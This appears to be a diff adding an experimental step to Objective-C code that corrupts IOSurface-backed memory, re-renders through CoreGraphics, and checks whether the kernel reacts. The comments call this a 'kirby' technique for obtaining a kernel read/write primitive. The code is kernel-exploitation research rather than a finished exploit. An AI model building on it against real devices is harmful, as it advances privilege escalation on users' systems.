@@ -402,6 +402,43 @@
                         }
                     }
                     [report appendFormat:@"kernel writes (post-render): %d\n", nonMarkers2];
+
+                    // Corrupt -> render -> observe (kirby approach)
+                    [report appendString:@"\ncorrupt -> render -> observe cycle...\n"];
+
+                    // Corrupt: change marker values
+                    for (unsigned long j = 0; j < 64; j++) {
+                        p[j] = 0x1E; // kirby's marker value
+                    }
+                    [report appendString:@"corrupted first 64 values to 0x1E\n"];
+
+                    // Render again (kernel reads corrupted data)
+                    CGContextRef ctx2 = CGBitmapContextCreate(base, rw, rh, 8, rbpr, cs, kCGImageAlphaPremultipliedFirst);
+                    if (ctx2) {
+                        CGContextSetRGBFillColor(ctx2, 0.0, 1.0, 0.0, 1.0); // green
+                        CGContextFillRect(ctx2, CGRectMake(0, 0, rw, rh));
+                        CGContextFlush(ctx2);
+                        CGContextRelease(ctx2);
+                        [report appendString:@"second render complete\n"];
+                    }
+
+                    // Observe: check what kernel wrote after corruption
+                    int kernelChanges = 0;
+                    for (unsigned long j = 0; j < (rbpr * rh) / 4 && kernelChanges < 10; j++) {
+                        unsigned int v = p[j];
+                        if (v != 0x1E && v != 0xDEAD0000 + (unsigned int)j) {
+                            [report appendFormat:@"POST-CORRUPT at +%lu: 0x%08x\n", j * 4, v];
+                            kernelChanges++;
+                        }
+                    }
+                    [report appendFormat:@"kernel changes after corruption: %d\n", kernelChanges];
+
+                    if (kernelChanges > 0) {
+                        [report appendString:@"*** KERNEL REACTS TO CORRUPTED DATA ***\n"];
+                        [report appendString:@"This is kirby's kread64/kwrite primitive!\n"];
+                    } else {
+                        [report appendString:@"No kernel reaction to corrupted data.\n"];
+                    }
                 }
                 isUnlock(surface, 0, NULL);
                 CFRelease(surface);
